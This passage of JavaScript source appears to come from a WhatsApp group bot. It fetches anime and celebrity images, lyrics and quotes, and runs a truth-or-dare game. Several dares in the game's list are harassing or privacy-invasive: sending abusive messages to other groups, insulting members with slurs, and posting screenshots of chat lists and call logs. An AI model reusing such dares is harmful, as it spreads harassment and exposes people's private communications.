              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json"
            );
          if (/hacker/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json"
            );
          if (/hestia/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json"
            );
          if (/husbu/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json"
            );
          if (/inori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json"
            );
          if (/islamic/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json"
            );
          if (/isuzu/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json"
            );
          if (/itachi/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json"
            );
          if (/itori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json"
            );
          if (/jennie/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json"
            );
          if (/jiso/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json"
            );
          if (/justina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json"
            );
          if (/kaga/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json"
            );
          if (/kagura/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json"
            );
          if (/kakasih/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json"
            );
          if (/kaori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json"
            );
          if (/cartoon/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json"
            );
          if (/shortquote/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json"
            );
          if (/keneki/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json"
            );
          if (/kotori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json"
            );
          if (/kpop/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json"
            );
          if (/kucing/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json"
            );
          if (/kurumi/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json"
            );
          if (/lisa/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json"
            );
          if (/loli/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json"
            );
          if (/madara/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json"
            );
          if (/megumin/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json"
            );
          if (/mikasa/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json"
            );
          if (/mikey/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json"
            );
          if (/miku/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json"
            );
          if (/minato/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json"
            );
          if (/mobile/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json"
            );
          if (/motor/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json"
            );
          if (/mountain/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json"
            );
          if (/naruto/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json"
            );
          if (/neko/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json"
            );
          if (/neko2/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json"
            );
          if (/nekonime/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json"
            );
          if (/nezuko/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json"
            );
          if (/onepiece/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json"
            );
          if (/pentol/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json"
            );
          if (/pokemon/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json"
            );
          if (/profil/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json"
            );
          if (/progamming/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json"
            );
          if (/pubg/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json"
            );
          if (/randblackpink/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json"
            );
          if (/randomnime/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json"
            );
          if (/randomnime2/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json"
            );
          if (/rize/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json"
            );
          if (/rose/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json"
            );
          if (/ryujin/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json"
            );
          if (/sagiri/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json"
            );
          if (/sakura/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json"
            );
          if (/sasuke/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json"
            );
          if (/satanic/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json"
            );
          if (/shina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json"
            );
          if (/shinka/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json"
            );
          if (/shinomiya/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json"
            );
          if (/shizuka/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json"
            );
          if (/shota/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json"
            );
          if (/space/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json"
            );
          if (/technology/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json"
            );
          if (/tejina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json"
            );
          if (/toukachan/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json"
            );
          if (/tsunade/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json"
            );
          if (/waifu/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json"
            );
          if (/wallhp/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json"
            );
          if (/wallml/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json"
            );
          if (/wallmlnime/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json"
            );
          if (/yotsuba/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json"
            );
          if (/yuki/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json"
            );
          if (/yulibocil/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json"
            );
          if (/yumeko/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json"
            );
          let yeha = heyy[Math.floor(Math.random() * heyy.length)];
          XliconBotInc.sendMessage(
            m.chat,
            { image: { url: yeha }, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case "lyrics":
        {
          if (!text)
            return replygcXlicon(
              `What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`
            );
          await XliconStickWait();
          let lyric = await fetch(
            `https://api.maher-zubair.tech/search/lyrics?q=${text}`
          );
          let jsonxeon = await lyric.json();
          if (jsonxeon.result.error) {
            replygcXlicon("Lyrics not found.");
          } else {
            replygcXlicon(
              `*Artist*: ${jsonxeon.result.artist}\n*Lyrics*:\n${jsonxeon.result.lyrics}`
            );
          }
        }
        break;
      case "pick":
        {
          if (!m.isGroup) return XeonStickGroup();
          if (!text)
            return replygcXlicon(
              `What do you want to pick?\nExample: ${prefix + command} idiot`
            );
          const groupMetadata = m.isGroup
            ? await XliconBotInc.groupMetadata(m.chat).catch((e) => {})
            : "";
          const participants = m.isGroup
            ? await groupMetadata.participants
            : "";
          let member = participants.map((u) => u.id);
          let me = m.sender;
          let xeonshimts = member[Math.floor(Math.random() * member.length)];
          XliconBotInc.sendMessage(
            from,
            {
              text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
              contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                mentionedJid: [xeonshimts],
                externalAdReply: {
                  showAdAttribution: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  containsAutoReply: true,
                  previewType: "PHOTO",
                  thumbnailUrl: ``,
                  thumbnail: fs.readFileSync(
                    `./XliconMedia/theme/xliconpic.jpg`
                  ),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "say":
      case "tts":
      case "gtts":
        {
          if (!text) return replygcXlicon("Where is the text?");
          //Limit text to maximum supported 200 characters!
          let texttts = text.substring(0, 200);
          const xeonrl = googleTTS.getAudioUrl(texttts, {
            lang: "en",
            slow: false,
            host: "https://translate.google.com",
          });
          return XliconBotInc.sendMessage(
            m.chat,
            {
              audio: {
                url: xeonrl,
              },
              mimetype: "audio/mp4",
              ptt: true,
              fileName: `${text}.mp3`,
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "fact":
        {
          const { data } = await axios.get(`https://nekos.life/api/v2/fact`);
          return replygcXlicon(`${themeemoji} *Fact:* ${data.fact}\n`);
        }
        break;
      case "quotes":
        const quotexeony = await axios.get(`https://favqs.com/api/qotd`);
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`;
        return replygcXlicon(textquotes);
        break;
      case "dare":
        const dare = [
          "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
          "spill people who make you pause",
          "call crush/pickle now and send ss",
          "drop only emote every time you type on gc/pc for 1 day.",
          "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
          "call ex saying miss",
          "sing the chorus of the last song you played",
          "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
          "Bang on the table (which is at home) until you get scolded for being noisy",
          "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
          "mention ex's name",
          "make 1 rhyme for the members!",
          "send ur whatsapp chat list",
          "chat random people with gheto language then ss here",
          "tell your own version of embarrassing things",
          "tag the person you hate",
          "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
          "change name to *I AM DONKEY* for 24 hours",
          "shout *ma chuda ma chuda ma chuda* in front of your house",
          "snap/post boyfriend photo/crush",
          "tell me your boyfriend type!",
          "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
          "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
          "prank chat ex and say *i love u, please come back.* without saying dare!",
          "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
          "change the name to *I am a child of randi* for 5 hours",
          "type in bengali 24 hours",
          "Use selmon bhoi photo for 3 days",
          "drop a song quote then tag a suitable member for that quote",
          "send voice note saying can i call u baby?",
          "ss recent call whatsapp",
          "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
          "pop to a group member, and say fuck you",
          "Act like a chicken in front of ur parents",
          "Pick up a random book and read one page out loud in vn n send it here",
          "Open your front door and howl like a wolf for 10 seconds",
          "Take an embarrassing selfie and paste it on your profile picture",
          "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
          "Walk on your elbows and knees for as long as you can",
          "sing national anthem in voice note",
          "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
          "Tell the saddest story you know",
          "make a twerk dance video and put it on status for 5mins",
          "Eat a raw piece of garlic",
          "Show the last five people you texted and what the messages said",
          "put your full name on status for 5hrs",
          "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
          "call ur bestie, bitch",
          "put your photo without filter on ur status for 10mins",
          "say i love oli london in voice noteðŸ¤£ðŸ¤£",
          "Send a message to your ex and say I still like you",
          "call Crush/girlfriend/bestie now and screenshot here",
          "pop to one of the group member personal chat and Say you ugly bustard",
          "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
          "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
          "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
          "use any bollywood actor photo as ur pfp for 3 days",
          "put your crush photo on status with caption, this is my crush",
          "change name to I AM GAY for 5 hours",
          "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
          "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
          "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
          "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
          "shout bravooooooooo and send here through voice note",
          "snap your face then send it here",
          "Send your photo with a caption, i am lesbian",
          "shout using harsh words and send it here through vn",
          "shout you bastard in front of your mom/papa",
          "change the name to i am idiot for 24 hours",
          "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
          "say i love the bot owner xeon through voice note",
          "send your gf/bf pic here",
          "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
          "breakup with your best friend for 5hrs without telling him/her that its a dare",
          "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
          "say i love depak kalal through voice note",
          "write i am feeling horny and put it on status, u can delete it only after 5hrs",
          "write i am lesbian and put it on status, u can delete only after 5hrs",
          "kiss your mommy or papa and say i love youðŸ˜Œ",
          "put your father name on status for 5hrs",
          "send abusive words in any grup, excepting this grup, and send screenshot proof here",
        ];
        const xeondare = dare[Math.floor(Math.random() * dare.length)];
        bufferdare = await getBuffer(
          `https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`
        );
        XliconBotInc.sendMessage(
          from,
          { image: bufferdare, caption: "_You choose DARE_\n" + xeondare },
          { quoted: m }
        );
        break;
        break;
      case "truth":
        const truth = [
          "Have you ever liked anyone? How long?",
          "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
          "apa ketakutan terbesar kamu?",
          "Have you ever liked someone and felt that person likes you too?",
          "What is the name of your friend's ex-girlfriend that you used to secretly like?",
          "Have you ever stolen money from your father or mom? The reason?",
          "What makes you happy when you're sad?",
          "Ever had a one sided love? if so who? how does it feel bro?",
          "been someone's mistress?",
          "the most feared thing",
          "Who is the most influential person in your life?",
          "what proud thing did you get this year",
          "Who is the person who can make you awesome",
          "Who is the person who has ever made you very happy?",
          "Who is closest to your ideal type of partner here",
          "Who do you like to play with??",
          "Have you ever rejected people? the reason why?",
          "Mention an incident that made you hurt that you still remember",
          "What achievements have you got this year??",
          "What's your worst habit at school??",
          "What song do you sing most in the shower",
          "Have you ever had a near-death experience",
          "When was the last time you were really angry. Why?",
          "Who is the last person who called you",
          "Do you have any hidden talents, What are they",
          "What word do you hate the most?",
          "What is the last YouTube video you watched?",
          "What is the last thing you Googled",
          "Who in this group would you want to swap lives with for a week",
          "What is the scariest thing thats ever happened to you",
          "Have you ever farted and blamed it on someone else",
          "When is the last time you made someone else cry",
          "Have you ever ghosted a friend",
          "Have you ever seen a dead body",
          "Which of your family members annoys you the most and why",
          "If you had to delete one app from your phone, which one would it be",
          "What app do you waste the most time on",
          "Have you ever faked sick to get home from school",
          "What is the most embarrassing item in your room",
          "What five items would you bring if you got stuck on a desert island",
          "Have you ever laughed so hard you peed your pants",
          "Do you smell your own farts",
          "have u ever peed on the bed while sleeping ??",
          "What is the biggest mistake you have ever made",
          "Have you ever cheated in an exam",
          "What is the worst thing you have ever done",
          "When was the last time you cried",
          "whom do you love the most among ur parents",
          "do u sometimes put ur finger in ur nosetril?",
          "who was ur crush during the school days",
          "tell honestly, do u like any boy in this grup",
          "have you ever liked anyone? how long?",
          "do you have gf/bf','what is your biggest fear?",
          "have you ever liked someone and felt that person likes you too?",
          "What is the name of your ex boyfriend of your friend that you once liked quietly?",
          "ever did you steal your mothers money or your fathers money",
          "what makes you happy when you are sad",
          "do you like someone who is in this grup? if you then who?",
          "have you ever been cheated on by people?",
          "who is the most important person in your life",
          "what proud things did you get this year",
          "who is the person who can make you happy when u r sad",
          "who is the person who ever made you feel uncomfortable",
          "have you ever lied to your parents",
          "do you still like ur ex",
          "who do you like to play together with?",
          "have you ever stolen big thing in ur life? the reason why?",
          "Mention the incident that makes you hurt that you still remember",
          "what achievements have you got this year?",
          "what was your worst habit at school?",
          "do you love the bot creator, xeon?ðŸ¤£",
          "have you ever thought of taking revenge from ur teacher?",
          "do you like current prime minister of ur country",
          "you non veg or veg",
          "if you could be invisible, what is the first thing you would do",
          "what is a secret you kept from your parents",
          "Who is your secret crush",
          "whois the last person you creeped on social media",
          "If a genie granted you three wishes, what would you ask for",
          "What is your biggest regret",
          "What animal do you think you most look like",
          "How many selfies do you take a day",
          "What was your favorite childhood show",
          "if you could be a fictional character for a day, who would you choose",
          "whom do you text the most",
          "What is the biggest lie you ever told your parents",
          "Who is your celebrity crush",
          "Whats the strangest dream you have ever had",
          "do you play pubg, if you then send ur id number",
        ];
        const xeontruth = truth[Math.floor(Math.random() * truth.length)];
        buffertruth = await getBuffer(
          `https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`
        );
        XliconBotInc.sendMessage(
          from,
          { image: buffertruth, caption: "_You choose TRUTH_\n" + xeontruth },
          { quoted: m }
        );
        break;
      case "cry":
      case "kill":
      case "hug":
      case "pat":
      case "lick":
      case "kiss":
      case "bite":
      case "yeet":
      case "bully":
      case "bonk":
      case "wink":
      case "poke":
      case "nom":
      case "slap":
      case "smile":
      case "wave":
      case "awoo":
      case "blush":
      case "smug":
      case "glomp":
      case "happy":
      case "dance":
      case "cringe":
      case "cuddle":
      case "highfive":
      case "shinobu":
      case "handhold":
        {
          axios
            .get(`https://api.waifu.pics/sfw/${command}`)
            .then(({ data }) => {
              XliconBotInc.sendImageAsSticker(from, data.url, m, {
                packname: global.packname,
                author: global.author,
              });
            });
        }
        break;
      case "woof":
      case "8ball":
      case "goose":
      case "gecg":
      case "feed":
      case "avatar":
      case "fox_girl":
      case "lizard":
      case "spank":
      case "meow":
      case "tickle":
        {
          axios
            .get(`https://nekos.life/api/v2/img/${command}`)
            .then(({ data }) => {
              XliconBotInc.sendImageAsSticker(from, data.url, m, {
                packname: global.packname,
                author: global.author,
              });
            });
        }
        break;
      case "animeawoo":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animemegumin":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeshinobu":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehandhold":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehighfive":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecringe":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animedance":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehappy":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeglomp":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animesmug":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeblush":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewave":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animesmile":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animepoke":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewink":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebonk":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebully":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeyeet":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebite":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animelick":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animekill":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecry":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewlp":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animekiss":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehug":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeneko":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animepat":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeslap":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecuddle":
        {
          await XliconStickWait();
          waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`);
          await XliconBotInc.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewaifu":
        {
          await XliconStickWait();
